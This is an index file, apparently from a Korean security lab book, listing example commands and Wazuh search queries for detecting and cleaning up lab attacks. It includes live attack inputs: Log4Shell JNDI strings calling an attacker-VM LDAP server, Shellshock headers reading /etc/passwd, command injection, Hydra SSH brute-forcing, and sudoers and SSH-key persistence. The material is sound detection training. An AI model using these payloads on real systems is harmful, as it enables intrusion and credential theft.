+6,6.8  로그인 처리 코드의 위치,C06-22,command,kt66-dvwa 컨테이너 안,exit,examples/chapter06/C06-22.txt
+6,6.9  원상복구와 조사 기록,C06-23,command,공격자 VM · 터미널,cat ~/book06-paths.txt,examples/chapter06/C06-23.txt
+6,6.9  원상복구와 조사 기록,C06-24,command,공격자 VM · 터미널,rm -i ~/book06-paths.txt,examples/chapter06/C06-24.txt
+6,6.9  원상복구와 조사 기록,C06-25,command,공격자 VM · 터미널,ls -l ~/book06-paths.txt,examples/chapter06/C06-25.txt
+6,6.10  다른 방법 · curl로 헤더 지정,C06-26,command,공격자 VM · 터미널,curl --version,examples/chapter06/C06-26.txt
+6,6.10  다른 방법 · curl로 헤더 지정,C06-27,command,공격자 VM · 터미널,"curl -i --max-time 15 \
+  -A ""sqlmap/1.0 book06-curl-ua"" \
+  http://dvwa.kt66.lab/book06-curl-ua",examples/chapter06/C06-27.txt
+6,6.10  다른 방법 · curl로 헤더 지정,Q06-12,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND data.url: *book06-curl-ua*",examples/chapter06/Q06-12.txt
+6,6.10  다른 방법 · curl로 메서드 지정,C06-28,command,공격자 VM · 터미널,"curl -i --max-time 15 -X PROPFIND \
+  http://dvwa.kt66.lab/book06-curl-method",examples/chapter06/C06-28.txt
+6,6.10  다른 방법 · curl로 메서드 지정,Q06-13,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND data.url: *book06-curl-method*",examples/chapter06/Q06-13.txt
+7,7.1  경보가 없을 때 원문 확인,C07-01,command,kt66 VM · 호스트 터미널,docker exec -it kt66-web /bin/bash,examples/chapter07/C07-01.txt
+7,7.1  경보가 없을 때 원문 확인,C07-02,command,kt66-web · 컨테이너 셸,tail -n 20 /var/log/apache2/dvwa_access.log,examples/chapter07/C07-02.txt
+7,7.1  경보가 없을 때 원문 확인,C07-03,command,kt66-web · 컨테이너 셸,exit,examples/chapter07/C07-03.txt
+7,7.2  감시 경로와 생성 전 확인,C07-04,command,kt66 VM · 호스트 터미널,docker exec -it kt66-web /bin/bash,examples/chapter07/C07-04.txt
+7,7.2  감시 경로와 생성 전 확인,C07-05,command,kt66-web · 컨테이너 셸,grep -n -F '/var/www' /var/ossec/etc/ossec.conf,examples/chapter07/C07-05.txt
+7,7.2  감시 경로와 생성 전 확인,C07-06,command,kt66-web · 컨테이너 셸,ls -ld /var/www/html/uploads,examples/chapter07/C07-06.txt
+7,7.2  웹셸 코드 저장,C07-07,command,kt66-web · 컨테이너 셸,ls -l /var/www/html/uploads/book07-shell.php,examples/chapter07/C07-07.txt
+7,7.2  웹셸 코드 저장,C07-08,command,kt66-web · 컨테이너 셸,vim /var/www/html/uploads/book07-shell.php,examples/chapter07/C07-08.txt
+7,7.2  파일 확인과 웹 요청,C07-09,command,kt66-web · 컨테이너 셸,cat /var/www/html/uploads/book07-shell.php,examples/chapter07/C07-09.txt
+7,7.2  파일 확인과 웹 요청,C07-10,command,kt66-web · 컨테이너 셸,exit,examples/chapter07/C07-10.txt
+7,7.2  FIM 경보와 요청 검색,Q07-01,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND rule.id: ""554""
+AND syscheck.path: *shell.php",examples/chapter07/Q07-01.txt
+7,7.2  FIM 경보와 요청 검색,Q07-02,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND data.url: *book07-shell.php*",examples/chapter07/Q07-02.txt
+7,7.2  실습 파일 원상복구,C07-11,command,kt66 VM · 호스트 터미널,docker exec -it kt66-web /bin/bash,examples/chapter07/C07-11.txt
+7,7.2  실습 파일 원상복구,C07-12,command,kt66-web · 컨테이너 셸,cat /var/www/html/uploads/book07-shell.php,examples/chapter07/C07-12.txt
+7,7.2  실습 파일 원상복구,C07-13,command,kt66-web · 컨테이너 셸,rm -i /var/www/html/uploads/book07-shell.php,examples/chapter07/C07-13.txt
+7,7.3  원문에서 입력 찾기,Q07-03,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND (full_log: *jndi* OR data.url: *jndi*)",examples/chapter07/Q07-03.txt
+7,7.3  변형과 수집의 빈틈,Q07-04,query,Windows · Discover · wazuh-archives-*,"agent.name: ""web""
+AND (full_log: *jndi* OR full_log: *lower*
+     OR data.url: *%24%7B*)",examples/chapter07/Q07-04.txt
+7,7.4  Shellshock 규칙 검색,Q07-05,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND (rule.id: (31166 OR 31167 OR 31168 OR 31169)
+     OR rule.description: *Shellshock*)",examples/chapter07/Q07-05.txt
+7,7.5  접속 기록의 필드 읽기,Q07-06,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND data.url: (*vulnerabilities/exec/* OR *track-order*)",examples/chapter07/Q07-06.txt
+7,7.5  명령 문자열과 WAF 검색,Q07-07,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND data.url:
+(*%3Bid* OR *;id* OR *%7Ccat* OR *cat%20*
+ OR *whoami* OR *%24%28*)",examples/chapter07/Q07-07.txt
+7,7.5  명령 문자열과 WAF 검색,Q07-08,query,Windows · Discover · wazuh-archives-*,"agent.name: ""web""
+AND location: ""/var/log/apache2/modsec_audit.log""",examples/chapter07/Q07-08.txt
+7,7.6  200 경보의 우선 조사,Q07-09,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND (rule.id: ""31106""
+ OR (rule.groups: ""attack"" AND data.id: ""200""))",examples/chapter07/Q07-09.txt
+7,7.7  SQL 인젝션 경보의 500,Q07-10,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND data.id: 5*",examples/chapter07/Q07-10.txt
+7,7.7  반복 오류 규칙과 대응,Q07-11,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND rule.id: (31161 OR 31162 OR 31163)",examples/chapter07/Q07-11.txt
+7,7.8  로그와 설정의 원본 위치,C07-14,command,kt66 VM · 호스트 터미널,docker exec -it kt66-web /bin/bash,examples/chapter07/C07-14.txt
+7,7.8  로그와 설정의 원본 위치,C07-15,command,kt66-web · 컨테이너 셸,"grep -n -F 'book07-shell.php' \
+  /var/log/apache2/landing_access.log",examples/chapter07/C07-15.txt
+7,7.8  로그와 설정의 원본 위치,C07-16,command,kt66-web · 컨테이너 셸,"grep -n -E 'ServerName|DocumentRoot|ProxyPass|SecRuleEngine' \
+  /etc/apache2/sites-enabled/*.conf",examples/chapter07/C07-16.txt
+7,7.8  감사 기록과 앱 처리기 조회,C07-17,command,kt66-web · 컨테이너 셸,tail -n 5 /var/log/apache2/modsec_audit.log,examples/chapter07/C07-17.txt
+7,7.8  감사 기록과 앱 처리기 조회,C07-18,command,kt66-web · 컨테이너 셸,exit,examples/chapter07/C07-18.txt
+7,7.8  감사 기록과 앱 처리기 조회,C07-19,command,kt66 VM · 호스트 터미널,docker exec -it kt66-dvwa /bin/bash,examples/chapter07/C07-19.txt
+7,7.8  감사 기록과 앱 처리기 조회,C07-20,command,kt66-dvwa · 컨테이너 셸,cat /var/www/html/vulnerabilities/exec/source/low.php,examples/chapter07/C07-20.txt
+7,7.8  감사 기록과 앱 처리기 조회,C07-21,command,kt66-dvwa · 컨테이너 셸,exit,examples/chapter07/C07-21.txt
+7,7.8  Manager의 규칙 정의 조회,C07-22,command,kt66 VM · 호스트 터미널,docker exec -it kt66-siem /bin/bash,examples/chapter07/C07-22.txt
+7,7.8  Manager의 규칙 정의 조회,C07-23,command,kt66-siem · 컨테이너 셸,"grep -n -A 16 -F 'id=""31106""' \
+  /var/ossec/ruleset/rules/0245-web_rules.xml",examples/chapter07/C07-23.txt
+7,7.9  다른 방법으로 요청 보내기,C07-24,command,공격자 VM · 터미널,curl --version,examples/chapter07/C07-24.txt
+7,7.9  JNDI 헤더와 URL,C07-25,command,공격자 VM · 터미널,"curl -i --max-time 15 --get \
+  -A '${jndi:ldap://192.168.0.108:1389/a}' \
+  --data-urlencode \
+  'q=${jndi:ldap://192.168.0.108:1389/a}' \
+  http://dvwa.ccc.com/",examples/chapter07/C07-25.txt
+7,7.9  JNDI 변형 헤더,C07-26,command,공격자 VM · 터미널,"curl -i --max-time 15 \
+  -H 'X-Api-Version: ${${lower:j}ndi:ldap://192.168.0.108:1389/b}' \
+  -A '${jndi:rmi://192.168.0.108:1099/c}' \
+  http://dvwa.ccc.com/",examples/chapter07/C07-26.txt
+7,7.9  Shellshock의 두 헤더,C07-27,command,공격자 VM · 터미널,"curl -i --max-time 15 \
+  -A '() { :; }; /bin/bash -c ""id""' \
+  http://juice.ccc.com/cgi-bin/test.cgi",examples/chapter07/C07-27.txt
+7,7.9  Shellshock의 두 헤더,C07-28,command,공격자 VM · 터미널,"curl -i --max-time 15 \
+  -H 'Referer: () { :; }; /bin/bash -c ""cat /etc/passwd""' \
+  http://dvwa.ccc.com/cgi-bin/status",examples/chapter07/C07-28.txt
+7,7.9  POST 본문과 인증 상태,C07-29,command,공격자 VM · 터미널,"curl -i --max-time 15 \
+  --data 'ip=127.0.0.1;id&Submit=Submit' \
+  http://dvwa.ccc.com/vulnerabilities/exec/",examples/chapter07/C07-29.txt
+7,7.9  원본 반복문의 구문,C07-30,command,공격자 VM · 터미널,"for i in $(seq 1 20); do
+  curl -sS --max-time 15 -o /dev/null \
+    -w ""%{http_code} "" \
+    ""http://juice.ccc.com/rest/products/search?q=%27$i""
+done
+printf ""\n""",examples/chapter07/C07-30.txt
+8,8.1  컨테이너와 수집 상태 확인,C08-01,command,Windows · 터미널,ssh ccc@192.168.0.107,examples/chapter08/C08-01.txt
+8,8.1  컨테이너와 수집 상태 확인,C08-02,command,kt66 VM · ccc 호스트 셸,"docker ps
+docker port kt66-bastion",examples/chapter08/C08-02.txt
+8,8.1  컨테이너와 수집 상태 확인,C08-03,command,kt66 VM · ccc 호스트 셸,docker exec -it kt66-bastion /bin/bash,examples/chapter08/C08-03.txt
+8,8.1  서버의 초기 상태 기록,C08-04,command,kt66-bastion · root 셸,"hostname
+/usr/sbin/sshd -T | grep -E \
+'^(port|permitrootlogin|passwordauthentication|maxauthtries) '",examples/chapter08/C08-04.txt
+8,8.1  서버의 초기 상태 기록,C08-05,command,kt66-bastion · root 셸,"passwd -S root
+/var/ossec/bin/wazuh-control status
+tail -n 10 /var/log/auth.log",examples/chapter08/C08-05.txt
+8,8.1  공격자 VM에 Hydra 준비,C08-06,command,Windows · 별도 터미널,ssh att@192.168.0.108,examples/chapter08/C08-06.txt
+8,8.1  공격자 VM에 Hydra 준비,C08-07,command,공격자 VM · att 셸,"command -v ssh
+command -v hydra",examples/chapter08/C08-07.txt
+8,8.1  공격자 VM에 Hydra 준비,C08-08,command,공격자 VM · att 셸,"sudo apt-get update
+sudo apt-get install -y hydra
+hydra -h",examples/chapter08/C08-08.txt
+8,8.1  목록 파일과 정상 로그인 준비,C08-09,command,공격자 VM · att 셸,ls -ld ~/book08,examples/chapter08/C08-09.txt
+8,8.1  목록 파일과 정상 로그인 준비,C08-10,command,공격자 VM · att 셸,"mkdir ~/book08
+cd ~/book08
+pwd",examples/chapter08/C08-10.txt
+8,8.1  목록 파일과 정상 로그인 준비,C08-11,command,공격자 VM · att 셸,ssh -p 2204 ccc@192.168.0.107,examples/chapter08/C08-11.txt
+8,8.1  서버 확인과 정상 인증 기록,C08-12,command,kt66-bastion · root 셸,"ssh-keygen -lf \
+/var/lib/bastion/ssh-host-keys/ssh_host_ed25519_key.pub",examples/chapter08/C08-12.txt
+8,8.1  서버 확인과 정상 인증 기록,C08-13,command,kt66-bastion · SSH로 접속한 ccc 셸,"hostname
+whoami
+id
+exit",examples/chapter08/C08-13.txt
+8,8.1  서버 확인과 정상 인증 기록,C08-14,command,kt66-bastion · root 셸,tail -n 20 /var/log/auth.log,examples/chapter08/C08-14.txt
+8,8.1  Discover에서 인증 로그 검색,Q08-01,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+location: ""/var/log/auth.log""",examples/chapter08/Q08-01.txt
+8,8.2  같은 계정에 암호 대입하기,C08-15,command,공격자 VM · att 셸,"cd ~/book08
+ls -l pw-fail.txt",examples/chapter08/C08-15.txt
+8,8.2  같은 계정에 암호 대입하기,C08-16,command,공격자 VM · att 셸,"printf '%s\n' \
+book08-wrong01 book08-wrong02 book08-wrong03 \
+book08-wrong04 book08-wrong05 book08-wrong06 \
+book08-wrong07 book08-wrong08 book08-wrong09 \
+book08-wrong10 book08-wrong11 book08-wrong12 \
+> pw-fail.txt
+cat pw-fail.txt
+wc -l pw-fail.txt",examples/chapter08/C08-16.txt
+8,8.2  인증 시도와 응답 읽기,C08-17,command,공격자 VM · att 셸,"timeout 45s hydra -l ccc -P pw-fail.txt \
+-t 4 -w 5 ssh://192.168.0.107:2204",examples/chapter08/C08-17.txt
+8,8.2  인증 시도와 응답 읽기,Q08-02,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+(rule.id: ""5760"" OR rule.id: ""5763"")",examples/chapter08/Q08-02.txt
+8,8.2  로그 압축으로 필드가 비는 경우,Q08-03,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+full_log: ""message repeated""",examples/chapter08/Q08-03.txt
+8,8.2  자동 대응의 실행 여부 확인,C08-18,command,kt66-bastion · root 셸,"tail -n 25 /var/ossec/logs/active-responses.log
+iptables -S",examples/chapter08/C08-18.txt
+8,8.3  존재하지 않는 계정 대입하기,C08-19,command,kt66-bastion · root 셸,"getent passwd book08-none1
+getent passwd book08-none2
+getent passwd book08-none3",examples/chapter08/C08-19.txt
+8,8.3  존재하지 않는 계정 대입하기,C08-20,command,공격자 VM · att 셸,"cd ~/book08
+ls -l users-invalid.txt
+printf '%s\n' book08-none1 book08-none2 \
+book08-none3 > users-invalid.txt
+cat users-invalid.txt",examples/chapter08/C08-20.txt
+8,8.3  잘못된 계정의 응답과 경보,C08-21,command,공격자 VM · att 셸,"timeout 30s hydra -L users-invalid.txt \
+-p book08-wrong -t 3 -w 5 \
+ssh://192.168.0.107:2204",examples/chapter08/C08-21.txt
+8,8.3  잘못된 계정의 응답과 경보,Q08-04,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+(rule.id: ""5710"" OR rule.id: ""5712"")",examples/chapter08/Q08-04.txt
+8,8.4  실패 뒤의 인증 성공 찾기,C08-22,command,공격자 VM · att 셸,"cd ~/book08
+ls -l pw-success.txt
+printf '%s\n' book08-bad1 book08-bad2 \
+book08-bad3 ccc > pw-success.txt
+cat pw-success.txt",examples/chapter08/C08-22.txt
+8,8.4  실패 뒤의 인증 성공 찾기,C08-23,command,공격자 VM · att 셸,"timeout 35s hydra -l ccc -P pw-success.txt \
+-t 1 -w 5 -f ssh://192.168.0.107:2204",examples/chapter08/C08-23.txt
+8,8.4  성공 뒤 셸과 기록 확인,C08-24,command,공격자 VM · att 셸,ssh -p 2204 ccc@192.168.0.107,examples/chapter08/C08-24.txt
+8,8.4  성공 뒤 셸과 기록 확인,C08-25,command,kt66-bastion · SSH로 접속한 ccc 셸,"hostname
+whoami
+id
+exit",examples/chapter08/C08-25.txt
+8,8.4  성공 뒤 셸과 기록 확인,Q08-05,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+data.srcip: ""192.168.0.108"" AND
+(rule.id: ""5760"" OR rule.id: ""5715"")",examples/chapter08/Q08-05.txt
+8,8.5  설정과 암호 상태 백업,C08-26,command,kt66-bastion · root 셸,"ls -l /root/book08-sshd_config.before \
+/root/book08-shadow.before
+passwd -S root",examples/chapter08/C08-26.txt
+8,8.5  설정과 암호 상태 백업,C08-27,command,kt66-bastion · root 셸,"cp -p /etc/ssh/sshd_config \
+/root/book08-sshd_config.before
+cp -p /etc/shadow /root/book08-shadow.before
+chmod 600 /root/book08-shadow.before",examples/chapter08/C08-27.txt
+8,8.5  설정과 암호 상태 백업,C08-28,command,kt66-bastion · root 셸,"cmp /etc/ssh/sshd_config \
+/root/book08-sshd_config.before
+cmp /etc/shadow /root/book08-shadow.before",examples/chapter08/C08-28.txt
+8,8.5  root 인증을 임시로 허용,C08-29,command,kt66-bastion · root 셸,vim /etc/ssh/sshd_config,examples/chapter08/C08-29.txt
+8,8.5  root 인증을 임시로 허용,C08-30,command,kt66-bastion · root 셸,passwd root,examples/chapter08/C08-30.txt
+8,8.5  유효 설정 검사와 재적용,C08-31,command,kt66-bastion · root 셸,"/usr/sbin/sshd -t
+/usr/sbin/sshd -T -C \
+user=root,addr=192.168.0.108,host=attacker \
+| grep -E '^(permitrootlogin|passwordauthentication) '",examples/chapter08/C08-31.txt
+8,8.5  유효 설정 검사와 재적용,C08-32,command,kt66-bastion · root 셸,"service ssh reload
+passwd -S root",examples/chapter08/C08-32.txt
+8,8.5  직접 로그인과 Wazuh 확인,C08-33,command,공격자 VM · att 셸,ssh -p 2204 root@192.168.0.107,examples/chapter08/C08-33.txt
+8,8.5  직접 로그인과 Wazuh 확인,Q08-06,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+rule.id: ""5715"" AND data.dstuser: ""root""",examples/chapter08/Q08-06.txt
+8,8.5  root 설정과 암호 원상복구,C08-34,command,kt66-bastion · root 셸,"ls -l /root/book08-sshd_config.before \
+/root/book08-shadow.before
+cp -p /root/book08-sshd_config.before \
+/etc/ssh/sshd_config
+cp -p /root/book08-shadow.before /etc/shadow",examples/chapter08/C08-34.txt
+8,8.5  root 설정과 암호 원상복구,C08-35,command,kt66-bastion · root 셸,"cmp /etc/ssh/sshd_config \
+/root/book08-sshd_config.before
+cmp /etc/shadow /root/book08-shadow.before
+/usr/sbin/sshd -t
+service ssh reload",examples/chapter08/C08-35.txt
+8,8.5  root 설정과 암호 원상복구,C08-36,command,kt66-bastion · root 셸,"passwd -S root
+/usr/sbin/sshd -T | grep permitrootlogin",examples/chapter08/C08-36.txt
+8,8.5  복구 뒤 새 연결로 확인,C08-37,command,공격자 VM · att 셸,"ssh -p 2204 -o NumberOfPasswordPrompts=1 \
+root@192.168.0.107",examples/chapter08/C08-37.txt
+8,8.5  복구 뒤 새 연결로 확인,C08-38,command,공격자 VM · att 셸,ssh -p 2204 ccc@192.168.0.107,examples/chapter08/C08-38.txt
+8,8.5  복구 뒤 새 연결로 확인,C08-39,command,kt66-bastion · root 셸,"rm -i /root/book08-sshd_config.before \
+/root/book08-shadow.before",examples/chapter08/C08-39.txt
+8,8.6  sudo 권한과 실행자 조사,C08-40,command,공격자 VM · att 셸,ssh -p 2204 ccc@192.168.0.107,examples/chapter08/C08-40.txt
+8,8.6  sudo 권한과 실행자 조사,C08-41,command,kt66-bastion · SSH로 접속한 ccc 셸,"id
+sudo -l",examples/chapter08/C08-41.txt
+8,8.6  root 권한 명령 실행,C08-42,command,kt66-bastion · SSH로 접속한 ccc 셸,"sudo -i id
+id",examples/chapter08/C08-42.txt
+8,8.6  root 권한 명령 실행,C08-43,command,kt66-bastion · SSH로 접속한 ccc 셸,"ls -l /etc/shadow
+sudo cat /etc/shadow > /dev/null
+echo $?",examples/chapter08/C08-43.txt
+8,8.6  sudo 원문과 필드 해석,Q08-07,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+(rule.id: ""5402"" OR rule.id: ""5403"")",examples/chapter08/Q08-07.txt
+8,8.7  새 계정과 권한 변경 조사,C08-44,command,공격자 VM · att 셸,ssh -p 2204 ccc@192.168.0.107,examples/chapter08/C08-44.txt
+8,8.7  새 계정과 권한 변경 조사,C08-45,command,kt66-bastion · SSH로 접속한 ccc 셸,"getent passwd book08-user
+getent group book08-user
+ls -ld /home/book08-user",examples/chapter08/C08-45.txt
+8,8.7  계정 생성과 암호 상태,C08-46,command,kt66-bastion · SSH로 접속한 ccc 셸,"sudo useradd -m -s /bin/bash book08-user
+getent passwd book08-user
+id book08-user
+sudo passwd -S book08-user",examples/chapter08/C08-46.txt
+8,8.7  계정 생성과 암호 상태,Q08-08,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+rule.id: ""5902""",examples/chapter08/Q08-08.txt
+8,8.7  생성 필드와 그룹 추가,C08-47,command,kt66-bastion · SSH로 접속한 ccc 셸,"sudo usermod -aG sudo book08-user
+id book08-user
+getent group sudo",examples/chapter08/C08-47.txt
+8,8.7  실행 요청과 변경 결과 대조,Q08-09,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+data.command: ""/usr/sbin/usermod -aG sudo book08-user""",examples/chapter08/Q08-09.txt
+8,8.7  실행 요청과 변경 결과 대조,C08-48,command,kt66-bastion · SSH로 접속한 ccc 셸,sudo grep -F 'book08-user' /var/log/auth.log,examples/chapter08/C08-48.txt
+8,8.7  계정 삭제와 원상복구,C08-49,command,kt66-bastion · SSH로 접속한 ccc 셸,"getent passwd book08-user
+id book08-user
+sudo userdel -r book08-user",examples/chapter08/C08-49.txt
+8,8.7  계정 삭제와 원상복구,C08-50,command,kt66-bastion · SSH로 접속한 ccc 셸,"getent passwd book08-user
+echo $?
+getent group book08-user
+echo $?
+ls -ld /home/book08-user
+getent group sudo",examples/chapter08/C08-50.txt
+8,8.7  삭제 기록의 계정 필드,Q08-10,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+rule.id: ""5903""",examples/chapter08/Q08-10.txt
+8,8.9  수집 설정과 대응 설정 읽기,C08-51,command,kt66-bastion · root 셸,"grep -n -A 3 -B 2 '/var/log/auth.log' \
+/var/ossec/etc/ossec.conf",examples/chapter08/C08-51.txt
+8,8.9  수집 설정과 대응 설정 읽기,C08-52,command,bastion 관리 셸 → kt66 VM 호스트,"exit
+docker exec -it kt66-siem /bin/bash",examples/chapter08/C08-52.txt
+8,8.9  수집 설정과 대응 설정 읽기,C08-53,command,kt66-siem · root 셸,"grep -n -A 6 -B 2 '<command>firewall-drop' \
+/var/ossec/etc/ossec.conf",examples/chapter08/C08-53.txt
+8,8.9  수집 설정과 대응 설정 읽기,C08-54,command,kt66-siem · root 셸,exit,examples/chapter08/C08-54.txt
+8,8.9  실습 파일과 세션 원상복구,C08-55,command,공격자 VM · att 셸,"cd ~/book08
+pwd
+ls -la",examples/chapter08/C08-55.txt
+8,8.9  실습 파일과 세션 원상복구,C08-56,command,공격자 VM · att 셸,rm -i pw-fail.txt users-invalid.txt pw-success.txt,examples/chapter08/C08-56.txt
+9,9.1  관리 창과 실습 창 준비,C09-01,command,Windows · 터미널,ssh ccc@192.168.0.107,examples/chapter09/C09-01.txt
+9,9.1  관리 창과 실습 창 준비,C09-02,command,kt66 VM · ccc 호스트 셸,"docker ps
+docker port kt66-bastion
+docker exec -it kt66-bastion /bin/bash",examples/chapter09/C09-02.txt
+9,9.1  관리 창과 실습 창 준비,C09-03,command,kt66-bastion · root 관리 셸,"hostname
+/var/ossec/bin/wazuh-control status
+visudo -c",examples/chapter09/C09-03.txt
+9,9.1  관리 창과 실습 창 준비,C09-04,command,kt66-bastion · root 관리 셸,"ls -l /etc/sudoers.d/ccc
+cat /etc/sudoers.d/ccc
+chmod 0440 /etc/sudoers.d/ccc
+visudo -c",examples/chapter09/C09-04.txt
+9,9.1  관리 창과 실습 창 준비,C09-05,command,Windows · 별도 터미널,ssh att@192.168.0.108,examples/chapter09/C09-05.txt
+9,9.1  관리 창과 실습 창 준비,C09-06,command,공격자 VM · att 셸,"ssh -p 2204 ccc@192.168.0.107
+hostname
+id",examples/chapter09/C09-06.txt
+9,9.1  파일 무결성 감시의 조건,C09-07,command,kt66-bastion · root 관리 셸,"sed -n '/<syscheck>/,/<\/syscheck>/p' \
+/var/ossec/etc/ossec.conf",examples/chapter09/C09-07.txt
+9,9.2  실습 22 · sudo 권한 파일 변경,C09-08,command,kt66-bastion · SSH로 접속한 ccc 셸,"sudo -l
+ls -l /etc/sudoers.d/99-book09-lab",examples/chapter09/C09-08.txt
+9,9.2  실습 22 · sudo 권한 파일 변경,C09-09,command,kt66-bastion · SSH로 접속한 ccc 셸,"printf '%s\n' 'ccc ALL=(ALL) NOPASSWD:ALL' | \
+sudo tee /etc/sudoers.d/99-book09-lab
+sudo chmod 0440 /etc/sudoers.d/99-book09-lab
+sudo visudo -cf /etc/sudoers.d/99-book09-lab
+sudo visudo -c",examples/chapter09/C09-09.txt
+9,9.2  추가와 수정 기록 구분,Q09-01,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND rule.groups: ""syscheck"" AND syscheck.path: ""/etc/sudoers.d/99-book09-lab""",examples/chapter09/Q09-01.txt
+9,9.2  추가와 수정 기록 구분,C09-10,command,kt66-bastion · SSH로 접속한 ccc 셸,"printf '%s\n' '# book09 checked' | \
+sudo tee -a /etc/sudoers.d/99-book09-lab
+sudo visudo -c",examples/chapter09/C09-10.txt
+9,9.2  추가와 수정 기록 구분,Q09-02,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND syscheck.path: ""/etc/sudoers.d/99-book09-lab"" AND syscheck.event: ""modified""",examples/chapter09/Q09-02.txt
+9,9.2  조사와 원상복구,C09-11,command,kt66-bastion · SSH로 접속한 ccc 셸,"sudo cat /etc/sudoers.d/99-book09-lab
+sudo rm /etc/sudoers.d/99-book09-lab
+ls -l /etc/sudoers.d/99-book09-lab
+sudo visudo -c
+sudo -l",examples/chapter09/C09-11.txt
+9,9.3  실습 23 · SSH 공개 키 등록,C09-12,command,공격자 VM · att 셸,"ls -ld ~/book09
+command -v ssh-keygen",examples/chapter09/C09-12.txt
+9,9.3  실습 23 · SSH 공개 키 등록,C09-13,command,공격자 VM · att 셸,"mkdir ~/book09
+ls -l ~/book09/book09_key*",examples/chapter09/C09-13.txt
+9,9.3  키 생성과 서버의 기존 상태 보존,C09-14,command,공격자 VM · att 셸,"ssh-keygen -t ed25519 -N '' \
+-C book09@attacker -f ~/book09/book09_key
+ssh-keygen -lf ~/book09/book09_key.pub
+cat ~/book09/book09_key.pub",examples/chapter09/C09-14.txt
+9,9.3  키 생성과 서버의 기존 상태 보존,C09-15,command,kt66-bastion · root 관리 셸,"ls -ld /home/ccc/.ssh
+ls -l /home/ccc/.ssh/authorized_keys
+ls -l /root/book09-authorized_keys.before
+stat -c ""%a %U %G %n"" \
+/home/ccc/.ssh /home/ccc/.ssh/authorized_keys",examples/chapter09/C09-15.txt
+9,9.3  키 생성과 서버의 기존 상태 보존,C09-16,command,kt66-bastion · root 관리 셸,"cp -p /home/ccc/.ssh/authorized_keys \
+/root/book09-authorized_keys.before
+sha256sum /home/ccc/.ssh/authorized_keys \
+/root/book09-authorized_keys.before",examples/chapter09/C09-16.txt
+9,9.3  키 생성과 서버의 기존 상태 보존,C09-17,command,kt66-bastion · root 관리 셸,"install -d -m 700 -o ccc -g ccc /home/ccc/.ssh
+install -m 600 -o ccc -g ccc /dev/null \
+/home/ccc/.ssh/authorized_keys
+ls -ld /home/ccc/.ssh
+ls -l /home/ccc/.ssh/authorized_keys",examples/chapter09/C09-17.txt
+9,9.3  공개 키 한 줄 추가와 접속,C09-18,command,kt66-bastion · SSH로 접속한 ccc 셸,cat >> /home/ccc/.ssh/authorized_keys,examples/chapter09/C09-18.txt
+9,9.3  공개 키 한 줄 추가와 접속,C09-19,command,kt66-bastion · SSH로 접속한 ccc 셸,"tail -n 1 /home/ccc/.ssh/authorized_keys
+stat -c ""%a %U %G %n"" \
+/home/ccc/.ssh/authorized_keys",examples/chapter09/C09-19.txt
+9,9.3  공개 키 한 줄 추가와 접속,C09-20,command,공격자 VM · att 셸,"ssh -p 2204 -i ~/book09/book09_key \
+-o IdentitiesOnly=yes -o BatchMode=yes \
+-o PreferredAuthentications=publickey \
+ccc@192.168.0.107 'hostname; id'",examples/chapter09/C09-20.txt
+9,9.3  파일 변경과 인증 성공 연결,Q09-03,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND rule.groups: ""syscheck"" AND syscheck.path: ""/home/ccc/.ssh/authorized_keys""",examples/chapter09/Q09-03.txt
+9,9.3  파일 변경과 인증 성공 연결,Q09-04,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND rule.id: ""5715"" AND data.dstuser: ""ccc"" AND data.srcip: ""192.168.0.108"" AND full_log: ""Accepted publickey""",examples/chapter09/Q09-04.txt
+9,9.3  키 제거와 원상복구 확인,C09-21,command,kt66-bastion · root 관리 셸,"sha256sum /root/book09-authorized_keys.before
+cp -p /root/book09-authorized_keys.before \
+/home/ccc/.ssh/authorized_keys
+cmp /root/book09-authorized_keys.before \
+/home/ccc/.ssh/authorized_keys
+printf ""cmp status=%s\n"" ""$?""",examples/chapter09/C09-21.txt
+9,9.3  키 제거와 원상복구 확인,C09-22,command,kt66-bastion · root 관리 셸,"ls -l /home/ccc/.ssh/authorized_keys
+rm /home/ccc/.ssh/authorized_keys
+ls -l /home/ccc/.ssh/authorized_keys",examples/chapter09/C09-22.txt
+9,9.3  키 제거와 원상복구 확인,C09-23,command,kt66-bastion · root 관리 셸,"stat -c ""%a %U %G %n"" \
+/home/ccc/.ssh/authorized_keys
+rm /root/book09-authorized_keys.before
+ls -l /root/book09-authorized_keys.before",examples/chapter09/C09-23.txt
+9,9.4  실습 24 · cron 예약 작업,C09-24,command,kt66-bastion · root 관리 셸,"command -v cron
+command -v curl
+service cron status
+ls -l /etc/cron.d/book09-lab \
+/tmp/book09-cron-result",examples/chapter09/C09-24.txt
+9,9.4  실습 24 · cron 예약 작업,C09-25,command,kt66-bastion · root 관리 셸,"apt-get update
+apt-get install -y --no-install-recommends cron
+command -v cron",examples/chapter09/C09-25.txt
+9,9.4  제공할 스크립트 준비,C09-26,command,공격자 VM · att 셸,"command -v python3
+ls -ld ~/book09/www
+mkdir ~/book09/www",examples/chapter09/C09-26.txt
